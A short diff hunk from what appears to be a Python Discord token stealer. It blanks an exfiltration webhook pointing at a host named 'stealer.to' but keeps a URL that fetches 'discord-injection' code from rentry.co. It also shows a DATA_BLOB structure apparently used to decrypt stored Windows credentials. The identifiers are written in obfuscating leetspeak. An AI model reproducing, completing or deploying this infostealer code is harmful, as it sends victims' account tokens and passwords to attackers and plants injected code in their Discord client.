@@ -68,7 +68,7 @@ for module in ModuleRequirements:
 
 
 
-h00k = "https://stealer.to/post?uniqueid=60b799c51467bc33"
+h00k = ""
 inj3c710n_url = f"https://rentry.co/discord-injection/raw"
 
 class DATA_BLOB(Structure):
